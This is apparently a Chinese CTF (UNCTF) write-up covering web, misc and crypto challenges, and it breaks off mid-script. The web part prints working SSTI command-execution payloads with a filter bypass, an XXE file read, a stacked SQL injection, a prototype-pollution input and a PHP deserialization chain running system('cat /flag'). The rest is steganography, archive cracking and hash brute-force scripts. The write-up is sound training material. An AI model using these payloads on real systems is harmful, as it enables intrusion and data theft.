ssti登录界面随便输入一个账号就能登录，经测试可以看到这里存在ssti\n\n\n用常规的payload去打，发现class被过滤了，使用拼接&#39;__cla&#39;+&#39;ss__&#39;绕过即可\n&#123;&#123;config[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;printenv&#x27;).read()&#125;&#125;\n\n还有不使用class的payload\n&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;printenv&#x27;).read()&#125;&#125; \n\n但是出题人告诉你flag在flag.txt，而flag实际上在环境变量里，令人感叹\n使用printenv函数即可\n\nPHP的xxe最基础的xxe，直接对dom.php post 数据即可\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe[    &lt;!ELEMENT test ANY &gt;    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;test&gt;    &lt;name&gt;&amp;xxe;&lt;/name&gt;        &lt;/test&gt;\n\n随便注魔改的是强网杯那道注入题，但是FLAG_COLUMN和FLAG_TABLE和使用的id表不在一个数据库下\n可以用sqlmap一把梭，但是犯了一个错误没有拿到flag:\n在所有的数据库里选择了ctftraining.FLAG_TABLE.FLAG_COLUMN，但是在从FLAG_COLUMN拖取数据的时候，得到的数据为空，之前在打国赛的时候，有一道注入题也是这个情况，sqlmap跑不出数据，换用自己的盲注脚本去得到数据，便以为这题也是这个情况，于是针对这题便使用了包括但不限于盲注，报错注入，重命名表的各种操作，都没有结果\n1&#x27;; alter table admin.haha rename to admin.haha1;alter table ctftraining.FLAG_TABLE rename to admin.haha;alter table admin.haha change FLAG_COLUMN id varchar(128);# \n\n后来复现的时候才知道直接读取文件 &#x2F;flag就行了😅\nbabynode基础的原型链污染\n&#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125;\n\nezunseri&lt;?phphighlight_file(__FILE__);error_reporting(0);class Exec&#123;    public $content;    public function execute($var)&#123;        eval($this-&gt;content);    &#125;    public function __get($name)&#123;        echo $this-&gt;content;    &#125;    public function __invoke()&#123;        $content = $this-&gt;execute($this-&gt;content);    &#125;    public function __wakeup()    &#123;        $this-&gt;content = &quot;&quot;;        die(&quot;1!5!&quot;);    &#125;&#125;class Test&#123;    public $test;    public $key;    public function __construct()&#123;        $this-&gt;test = &quot;test123&quot;;    &#125;    public function __toString()&#123;        $name = $this-&gt;test;        $name();    &#125;&#125; class Login&#123;    private $name;    public $code = &quot; JUST FOR FUN&quot;;    public $key;    public function __construct($name=&quot;UNCTF&quot;)&#123;        $this-&gt;name = $name;    &#125;    public function show()&#123;        echo $this-&gt;name.$this-&gt;code;    &#125;    public function __destruct()&#123;        if($this-&gt;code = &#x27;3.1415926&#x27;)&#123;            return $this-&gt;key-&gt;name;        &#125;    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    $a = unserialize($_GET[pop]);&#125;else&#123;   $a = new Login();   $a-&gt;show();&#125;\n\n利用\nLogin-&gt;__destruct =&gt; Exec-&gt;__get =&gt; Test.__toString =&gt; Exec-&gt;__invoke =&gt; Exec-&gt;execute =&gt; eval\n\n&lt;?phpclass Exec&#123;    public $content;&#125;class Test&#123;    public $test;    public $key;&#125; class Login&#123;    private $name;    public $code = &quot; JUST FOR FUN&quot;;    public $key;&#125;$login=new Login();$login-&gt;code = &#x27;3.1415926&#x27;;$login-&gt;key = new Exec();$login-&gt;key-&gt;content = new Test();$login-&gt;key-&gt;content-&gt;test=new Exec();$login-&gt;key-&gt;content-&gt;test-&gt;content=&#x27;system(&quot;cat /flag&quot;);&#x27;;$payload = urlencode(serialize($login));\n\n之后payload里替换参数个数绕过wakeup\n以下是没写出来的题目，再等靶场修复之后复现\npoppop反序列化构造pop链\neasy_rce命令注入的盲注，倒是第一次见，过滤了很多，但是还能读取，之后用cut -c结合盲注去判断\nez2048先在JS里面找出来邀请码的计算函数\nMISCmagic_word把word文档后缀改成zip，拿document.xml里面的内容去零宽网站解密即可\n\n找得到我吗word改成zip，在document.xml里面可以搜到flag\nsyslog直接搜索password，解开base64就是压缩包密码\n社什么社把记事本字体调成华文琥珀粗斜体，然后缩放到最小，可以看清是一个湖中倒影\n\n结合出题人在湖南，可以轻松的猜出来地点是 凤凰古城，MD5后就是flag\nIn_the_Morse_Garden文字颜色被设置为了白色，全选即可复制出来\nUNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm +WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5 46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k 5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm +WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y 2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3 lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54 6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y +k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T ljaE=&#125;\n\n按照图片解一下中间部分（Base64，替换，摩斯）即可\n\n巨鱼打开压缩包是一个图片，用010打开可以看到后面明显的压缩包，使用foremost分离即可\n同时修改图片的高度，可以看见下面藏着一个无所谓我会出手，这个便是压缩包的密码\n\n解开之后有个flag.txt是假的，flagisnothere.zip是伪加密，修改成00就可以解密\n\n里面有一个pass.png和一个加密的ppt\n\n这个外号666，而666就是ppt的密码，修改ppt为未加密模式，后缀改成zip解压\n\n最后在slide5.xml里面找到flag\n\nzhiyinzhiyin.png的文件结尾有段摩斯密码，解出来_UNC7F!!!\nlanqiu.jpg是字节反转的jpg文件，用脚本转回来\nf = open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\zhiyin\\\\lanqiu.jpg&#x27;,&#x27;wb&#x27;).write(open(&quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\zhiyin\\\\qiulan.jpg&quot;,&#x27;rb&#x27;).read()[::-1])\n\n\n拼凑起来密码，然而出题人手写的密码不知道是什么，只能凭感觉生成，并且用ARCHPR进行大小写爆破\nGo-play_UNC7F!!!Go-pLay_UNC7F!!!Go-p1ay_UNC7F!!!Go-p7ay_UNC7F!!!Go_play_UNC7F!!!Go_pLay_UNC7F!!!Go_p1ay_UNC7F!!!Go_p7ay_UNC7F!!!GO-play_UNC7F!!!GO-pLay_UNC7F!!!GO-p1ay_UNC7F!!!GO-p7ay_UNC7F!!!GO_play_UNC7F!!!GO_pLay_UNC7F!!!GO_p1ay_UNC7F!!!GO_p7ay_UNC7F!!!G0-play_UNC7F!!!G0-pLay_UNC7F!!!G0-p1ay_UNC7F!!!G0-p7ay_UNC7F!!!G0_play_UNC7F!!!G0_pLay_UNC7F!!!G0_p1ay_UNC7F!!!G0_p7ay_UNC7F!!!\n\n最后密码是Go_p1ay_unc7f!!!令人感叹，解开压缩包拿到flag\n清和fan首先是搜索B站UID和视频日期得到836885_2022/05/20压缩密码（还好之前关注过她）\n然后得到的图片存在lsb隐写，得到密码password is :qq857488580\n解出来的音频一眼sstv\n\n得到密码V@mpir3，解开压缩包得到一段文字，一眼零宽，拿上面的网站得到flag\nunctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;\n\n芝麻开门图片用stegsolve看到存在明显的lsb，而且是带密码的\n开头给的key是假的，拉到最下面能看到a2V5MQ&#x3D;&#x3D;，base64解得key1\npython2 lsb.py extract flag.png 1.txt key1\n\n得到flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;\n剥茧抽丝评价是一坨屎\n第一层 看到压缩包的注释里写个S?e?a?o?r?p?y，很标准的掩码格式，但是在掩码模式试了一蹦子发现啥也不是，解压密码就是S?e?a?o?r?p?y😅\n第二层1.txt明显有零宽，但是通过复制粘贴得到的密码明显不全，便用网站下面的文件解密，能密码PAsS_w0rD\n但是这个密码并不能解开这一层压缩包，压缩包之后发现里面有个2.txt和一个压缩包，把1.txt去掉零宽之后的字符保存为2.txt，用bandizip压缩后发现CRC值与2.txt的相同，竟然是明文攻击……\n用ARCHPR攻击一会就能解开，不需要恢复出明文密码，而最里面的压缩包需要的密码就是刚刚得到的PAsS_w0rD\n我小心海也绝非鳝类\n我超OP\n用stegsolve看到存在LSB，而且文件末尾有段RUFTWUxTQg==，base64得到EASYLSB\n便猜测是带密码的LSB隐写，对F#S&lt;YIcHnAG;进行base92解码，可以得到flaginmd5\npython2 lsb.py extract flag.png 1.txt flaginmd5\n\n长度为672，正好能被32整除，便猜测是一堆md5值拼起来的，用之前的md5-1题目的脚本即可\nfrom hashlib import md5hashlist=[&quot;8FA14CDD754F91CC6554C9E71929CCE7&quot;,&quot;2DB95E8E1A9267B7A1188556B2013B33&quot;,&quot;0CC175B9C0F1B6A831C399E269772661&quot;,&quot;B2F5FF47436671B6E533D8DC3614845D&quot;,&quot;F95B70FDC3088560732A5AC135644506&quot;,&quot;F1290186A5D0B1CEAB27F4E77C0C5D68&quot;,&quot;E1671797C52E15F763380B45E841EC32&quot;,&quot;2DB95E8E1A9267B7A1188556B2013B33&quot;,&quot;4A8A08F09D37B73795649038408B5F33&quot;,&quot;D95679752134A2D9EB61DBD7B91C4BCC&quot;,&quot;6F8F57715090DA2632453988D9A1501B&quot;,&quot;E1671797C52E15F763380B45E841EC32&quot;,&quot;B14A7B8059D9C055954C92674CE60032&quot;,&quot;E358EFA489F58062F10DD7316B65649E&quot;,&quot;D95679752134A2D9EB61DBD7B91C4BCC&quot;,&quot;B14A7B8059D9C055954C92674CE60032&quot;,&quot;6F8F57715090DA2632453988D9A1501B&quot;,&quot;865C0C0B4AB0E063E5CAA3387C1A8741&quot;,&quot;03C7C0ACE395D80182DB07AE2C30F034&quot;,&quot;4A8A08F09D37B73795649038408B5F33&quot;,&quot;CBB184DD8E05C9709E5DCAEDAA0495CF&quot;]dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#125;&#123;&quot;flag =&quot;&quot;for i in hashlist:    print(i)    for x in dic:        if md5(x.encode()).hexdigest() == i.lower():            # print(x)            flag += xprint(flag)  #flag&#123;welcometomisc&#125;\n\nMY PICTURE解压之后是一个没后缀的zip，再次解压之后得到一个dat文件和一个flag.png\ndat文件打开后发现很多的8E字节，便猜测是异或了8E,再次异或回来后得到一个压缩包\n\n\n解压后得到加密时使用的脚本\nfrom PIL import Image as imflag = im.open(&#x27;flag.jpg&#x27;,&#x27;r&#x27;)l,h=flag.sizepuzzle=im.new(&#x27;RGB&#x27;,(h,l))print(puzzle)for i in range(l):    for j in range(h):        r,g,b=flag.getpixel((i,j))        r=r^g        g=g^b        b=b^r        puzzle.putpixel(((i*787+j)//1200,(i*787+j)%1200),(b,g,r))puzzle.save(&#x27;flag.png&#x27;)flag.close()puzzle.close()\n\n逆着改出来解密脚本\nfrom PIL import Image as imflag = im.open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\Picture\\\\flag.png&#x27;,&#x27;r&#x27;)l,h=flag.sizeans=im.new(&#x27;RGB&#x27;,(h,l))for i in range(l):    for j in range(h):        r,g,b=flag.getpixel((i,j))        b = b ^ r        g = g ^ b        r = r ^ g        ans.putpixel(((i*1200+j)//787,(i*1200+j)%787),(b,g,r))ans.save(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\Picture\\\\realflag.png&#x27;)\n\n可以看到flag在图片里\n\nCatchJerry根据题目描述，流量里包含了鼠标和键盘的流量\n使用tshark分离出usb流量\n我这里原来没有分离出鼠标流量，原因是wireshark版本问题，令人感叹\ntshark.exe -r .\\CatchJerry.pcapng -T fields -e usbhid.data &gt; usbdata.txt\n\n首先分析鼠标流量，通过下面这个脚本分析出鼠标流量的坐标\nfrom textwrap import wrapdef convert_to_signed_char(c):    if c &gt; 127:        return (256-c) * (-1)    else:        return c# Transform to actual data linesdata_lines = (wrap(line.strip(), 2) for line in open(&quot;out.txt&quot;).readlines())data_packets = []for l in data_lines:    data_packets.append([convert_to_signed_char(int(a, 16)) for a in l])# Remove trailing data# data_packets = data_packets[:-1400]# Write to filewith open(&quot;plot.txt&quot;, &quot;w&quot;) as f:    x = 0    y = 0    for packet in data_packets:        try:            x += packet[1] * 20     # Scale-up X-axis            y -= packet[2]          # Invert Y-axis            if packet[0] == 1:                f.write(f&quot;&#123;x&#125; &#123;y&#125;\\n&quot;)        except:            pass\n\n然后使用gnuplot绘图，如图所示\n\n接着分析键盘流量，由于新版本的usbdata.txt没有冒号了，只能使用网上找的套神的脚本\nnormalKeys = &#123;&quot;04&quot;: &quot;a&quot;, &quot;05&quot;: &quot;b&quot;, &quot;06&quot;: &quot;c&quot;, &quot;07&quot;: &quot;d&quot;, &quot;08&quot;: &quot;e&quot;, &quot;09&quot;: &quot;f&quot;, &quot;0a&quot;: &quot;g&quot;, &quot;0b&quot;: &quot;h&quot;, &quot;0c&quot;: &quot;i&quot;,              &quot;0d&quot;: &quot;j&quot;, &quot;0e&quot;: &quot;k&quot;, &quot;0f&quot;: &quot;l&quot;, &quot;10&quot;: &quot;m&quot;, &quot;11&quot;: &quot;n&quot;, &quot;12&quot;: &quot;o&quot;, &quot;13&quot;: &quot;p&quot;, &quot;14&quot;: &quot;q&quot;, &quot;15&quot;: &quot;r&quot;,              &quot;16&quot;: &quot;s&quot;, &quot;17&quot;: &quot;t&quot;, &quot;18&quot;: &quot;u&quot;, &quot;19&quot;: &quot;v&quot;, &quot;1a&quot;: &quot;w&quot;, &quot;1b&quot;: &quot;x&quot;, &quot;1c&quot;: &quot;y&quot;, &quot;1d&quot;: &quot;z&quot;, &quot;1e&quot;: &quot;1&quot;,              &quot;1f&quot;: &quot;2&quot;, &quot;20&quot;: &quot;3&quot;, &quot;21&quot;: &quot;4&quot;, &quot;22&quot;: &quot;5&quot;, &quot;23&quot;: &quot;6&quot;, &quot;24&quot;: &quot;7&quot;, &quot;25&quot;: &quot;8&quot;, &quot;26&quot;: &quot;9&quot;, &quot;27&quot;: &quot;0&quot;,              &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;-&quot;, &quot;2e&quot;: &quot;=&quot;, &quot;2f&quot;: &quot;[&quot;,              &quot;30&quot;: &quot;]&quot;, &quot;31&quot;: &quot;\\\\&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;;&quot;, &quot;34&quot;: &quot;&#x27;&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;,&quot;, &quot;37&quot;: &quot;.&quot;, &quot;38&quot;: &quot;/&quot;,              &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,              &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;: &quot;A&quot;, &quot;05&quot;: &quot;B&quot;, &quot;06&quot;: &quot;C&quot;, &quot;07&quot;: &quot;D&quot;, &quot;08&quot;: &quot;E&quot;, &quot;09&quot;: &quot;F&quot;, &quot;0a&quot;: &quot;G&quot;, &quot;0b&quot;: &quot;H&quot;, &quot;0c&quot;: &quot;I&quot;,             &quot;0d&quot;: &quot;J&quot;, &quot;0e&quot;: &quot;K&quot;, &quot;0f&quot;: &quot;L&quot;, &quot;10&quot;: &quot;M&quot;, &quot;11&quot;: &quot;N&quot;, &quot;12&quot;: &quot;O&quot;, &quot;13&quot;: &quot;P&quot;, &quot;14&quot;: &quot;Q&quot;, &quot;15&quot;: &quot;R&quot;,             &quot;16&quot;: &quot;S&quot;, &quot;17&quot;: &quot;T&quot;, &quot;18&quot;: &quot;U&quot;, &quot;19&quot;: &quot;V&quot;, &quot;1a&quot;: &quot;W&quot;, &quot;1b&quot;: &quot;X&quot;, &quot;1c&quot;: &quot;Y&quot;, &quot;1d&quot;: &quot;Z&quot;, &quot;1e&quot;: &quot;!&quot;,             &quot;1f&quot;: &quot;@&quot;, &quot;20&quot;: &quot;#&quot;, &quot;21&quot;: &quot;$&quot;, &quot;22&quot;: &quot;%&quot;, &quot;23&quot;: &quot;^&quot;, &quot;24&quot;: &quot;&amp;&quot;, &quot;25&quot;: &quot;*&quot;, &quot;26&quot;: &quot;(&quot;, &quot;27&quot;: &quot;)&quot;,             &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;_&quot;, &quot;2e&quot;: &quot;+&quot;, &quot;2f&quot;: &quot;&#123;&quot;,             &quot;30&quot;: &quot;&#125;&quot;, &quot;31&quot;: &quot;|&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;\\&quot;&quot;, &quot;34&quot;: &quot;:&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;&lt;&quot;, &quot;37&quot;: &quot;&gt;&quot;, &quot;38&quot;: &quot;?&quot;,             &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,             &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125;nums = []keys = open(&#x27;usbdata.txt&#x27;)for line in keys:    if len(line) != 17:        continue    nums.append(line[0:2] + line[4:6])keys.close()output = &quot;&quot;for n in nums:    if n[2:4] == &quot;00&quot;:        continue    if n[2:4] in normalKeys:        if n[0:2] == &quot;02&quot;:            output += shiftKeys[n[2:4]]        else:            output += normalKeys[n[2:4]]    else:        output += &#x27;&#x27;print(&#x27;output :&#x27; + output)\n\n输出结果output :&lt;DEL&gt;&lt;RET&gt;andbest \n故得到flag:  UNCTF&#123;TOM_AND_JERRY_BEST_FRIENDS&#125;\n贝斯家族的侵略第一层是很明显的明文攻击，用hint那个图片作为明文\n得到的flag.txt，一眼base64隐写\nimport binasciidef get_base64_diff_value(s1, s2):    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;    res = 0    for i in xrange(len(s2)):        if s1[i] != s2[i]:            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))    return resdef solve_stego():    with open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\src\\\\flag.txt&#x27;, &#x27;rb&#x27;) as f:        file_lines = f.readlines()        bin_str = &#x27;&#x27;        for line in file_lines:            steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)            norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)            diff = get_base64_diff_value(steg_line, norm_line)            # print diff            pads_num = steg_line.count(&#x27;=&#x27;)            if diff:                bin_str += bin(diff)[2:].zfill(pads_num * 2)            else:                bin_str += &#x27;0&#x27; * pads_num * 2            # print bin_str        return bin_str            # print goflag(bin_str)def goflag(bin_str):    res_str = &#x27;&#x27;    for i in xrange(0, len(bin_str), 8):        res_str += chr(int(bin_str[i:i + 8], 2))    return res_strif __name__ == &#x27;__main__&#x27;:    bins = solve_stego()    x = goflag(bins)    print x\n\n\n\n得到了一大串数字，但是根据开头的几个字节，可以确定隐写的是一个mrf鼠标宏文件，将隐写的结果保存为一个文件falg.mrf即可，然后使用软件播放鼠标宏得到flag\n\n峰回路转根据压缩包里面的两个短文件，可以确定是CRC32爆破\nimport binasciiimport stringfrom time import sleepdef is_number(s):    try:        float(s)        return True    except ValueError:        pass    try:        import unicodedata        unicodedata.numeric(s)        return True    except (TypeError, ValueError):        pass    return False# 进度条def progress(percent=0, width=40):    left = width * percent // 95    right = width - left    print(&#x27;\\r[&#x27;, &#x27;#&#x27; * left, &#x27; &#x27; * right, &#x27;]&#x27;, f&#x27; &#123;percent:.0f&#125;%&#x27;, sep=&#x27;&#x27;, end=&#x27;&#x27;, flush=True)# 一位字节def crc1(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        s = i        if hex(binascii.crc32(s.encode())) == strs:            rs += s            print(strs + &#x27;  ： &#x27; + s)    return rs# 两位字节def crc2(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        for j in dic:            s = i + j            if hex(binascii.crc32(s.encode())) == strs:                rs += s                print(strs + &#x27;  ： &#x27; + s)    return rs# 三位字节def crc3(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        for j in dic:            for k in dic:                s = i + j + k                if hex(binascii.crc32(s.encode())) == strs:                    rs += s                    print(strs + &#x27;  ： &#x27; + s)    return rs# 四位字节def crc4(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    it = 1    for i in dic:        for j in dic:            for k in dic:                for m in dic:                    s = i + j + k + m                    if hex(binascii.crc32(s.encode())) == strs:                        rs += s                        print()                        print(strs + &#x27;  ： &#x27; + s)                        print(&#x27;\\n&#x27;)        progress(it)        sleep(0.1)        it += 1    return rs# 五位字节def crc5(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    it = 1    for i in dic:        progress(it)        for j in dic:            for k in dic:                for m in dic:                    for n in dic:                        s = i + j + k + m + n                        if hex(binascii.crc32(s.encode())) == strs:                            rs += s                            print()                            print(strs + &#x27;  ： &#x27; + s)                            print(&#x27;\\n&#x27;)        sleep(0.1)        it += 1    return rs# 计算碰撞 crcdef CrackCrc(crclist, length):    print()    print(&quot;正在计算...&quot;)    print()    dic = &#x27;&#x27;&#x27; !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&#x27;&#x27;&#x27;  # 碰撞需要的字符字典    dic = dic[::-1]    text = &#x27;&#x27;    for i in crclist:        if length == &#x27;1&#x27;:            text += crc1(i, dic)        if length == &#x27;2&#x27;:            text += crc2(i, dic)        if length == &#x27;3&#x27;:            text += crc3(i, dic)        if length == &#x27;4&#x27;:            text += crc4(i, dic)        if length == &#x27;5&#x27;:            text += crc5(i, dic)    print(&#x27;\\n&#x27;)    if text == &#x27;&#x27;:        print(&quot;碰撞失败,无结果&quot;)        exit()    print(&quot;字符顺序组合：&quot;, end=&#x27; &#x27;)    print()    print(text)    print()    input(&quot;回车确认结束程序...&quot;)# 主函数print(&#x27;&#x27;&#x27;#################################### Author：spaceman ######### Thank you for your use #################################&#x27;&#x27;&#x27;)listcrc = []  # 用于存储crc值length = (input(&quot;请输入文本字节大小(1-5)：&quot;))  # 即文本内容大小，如文本内容为flag，大小即为4if is_number(length) == False or length not in (&quot;1,2,3,4,5&quot;):    exit(&quot;非指定数字，退出&quot;)print()while 1:    crc = input(&#x27;请输入crc值(例如:d1f4eb9a,输入n完成输入):&#x27;)    if crc == &#x27;n&#x27;:        break    crc = &#x27;0x&#x27; + crc    if len(crc) != 10:        print(&quot;rcr长度不对,请重新输入&quot;)        continue    listcrc.append(crc)CrackCrc(listcrc, length)\n\n爆破出来P@SsW0RD 但是只能解压出来flag.bmp\n根据hint，使用带密码的silenteye\n\n得到flag.zip，但是里面的看好你.jpg屁用没有，flag.txt是伪加密\n没想到最后一步是异或爆破，唉\n\nCRYPTOMD5-1简单的md5碰撞\nfrom hashlib import md5hashlist=[&quot;4c614360da93c0a041b22e537de151eb&quot;,&quot;8d9c307cb7f3c4a32822a51922d1ceaa&quot;,&quot;0d61f8370cad1d412f80b84d143e1257&quot;,&quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;,&quot;800618943025315f869e4e1f09471012&quot;,&quot;f95b70fdc3088560732a5ac135644506&quot;,&quot;e1671797c52e15f763380b45e841ec32&quot;,&quot;c9f0f895fb98ab9159f51fd0297e236d&quot;,&quot;a87ff679a2f3e71d9181a67b7542122c&quot;,&quot;8fa14cdd754f91cc6554c9e71929cce7&quot;,&quot;e1671797c52e15f763380b45e841ec32&quot;,&quot;8277e0910d750195b448797616e091ad&quot;,&quot;cfcd208495d565ef66e7dff9f98764da&quot;,&quot;c81e728d9d4c2f636f067f89cc14862c&quot;,&quot;c9f0f895fb98ab9159f51fd0297e236d&quot;,&quot;92eb5ffee6ae2fec3ad71c777531578f&quot;,&quot;45c48cce2e2d7fbdea1afc51c7c6ad26&quot;,&quot;cfcd208495d565ef66e7dff9f98764da&quot;,&quot;a87ff679a2f3e71d9181a67b7542122c&quot;,&quot;1679091c5a880faf6fb5e6087eb1b2dc&quot;,&quot;8fa14cdd754f91cc6554c9e71929cce7&quot;,&quot;4a8a08f09d37b73795649038408b5f33&quot;,&quot;cfcd208495d565ef66e7dff9f98764da&quot;,&quot;e1671797c52e15f763380b45e841ec32&quot;,&quot;c9f0f895fb98ab9159f51fd0297e236d&quot;,&quot;8fa14cdd754f91cc6554c9e71929cce7&quot;,&quot;cfcd208495d565ef66e7dff9f98764da&quot;,&quot;c9f0f895fb98ab9159f51fd0297e236d&quot;,&quot;cfcd208495d565ef66e7dff9f98764da&quot;,&quot;e1671797c52e15f763380b45e841ec32&quot;,&quot;45c48cce2e2d7fbdea1afc51c7c6ad26&quot;,&quot;1679091c5a880faf6fb5e6087eb1b2dc&quot;,&quot;e1671797c52e15f763380b45e841ec32&quot;,&quot;8f14e45fceea167a5a36dedd4bea2543&quot;,&quot;c81e728d9d4c2f636f067f89cc14862c&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;,&quot;c9f0f895fb98ab9159f51fd0297e236d&quot;,&quot;a87ff679a2f3e71d9181a67b7542122c&quot;,&quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot;]dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#125;&#123;&quot;flag =&quot;&quot;for i in hashlist:    print(i)    for x in dic:        if md5(x.encode()).hexdigest() == i:            # print(x)            flag += xprint(flag)\n\nMD5-2简单的MD5碰撞\nfrom hashlib import 